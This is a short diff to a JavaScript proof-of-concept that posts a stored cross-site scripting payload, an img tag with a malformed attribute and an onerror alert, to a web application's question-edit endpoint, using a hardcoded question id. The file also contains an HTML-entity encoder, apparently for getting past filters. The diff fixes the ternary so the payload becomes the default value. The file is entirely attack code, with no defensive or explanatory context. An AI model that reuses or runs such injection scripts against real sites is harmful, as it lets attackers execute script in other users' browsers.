@@ -1,7 +1,7 @@
 function xss(content) {
 	this.url = "/?ajax.test.editQuestion",
 	this.data = {
-		"content":  typeof content !="undefined" ? content || 'title<img src="1" on" onerror="alert(/x/)" />',
+		"content":  typeof content !="undefined" ? content : 'title<img src="1" on" onerror="alert(/x/)" />',
 		"right": 'right',
 		"qid": '47c980353ywR1RAFEBUAYBHxUcCQBVVAlSBAYGVkwTTA',
 		"options[]": 'false',
@@ -19,4 +19,5 @@ xss.prototype = {
 		return "&#" + str.split("").map(function(data) {return data.charCodeAt();}).join("&#");
 	}
 }
+
 var x = new xss;
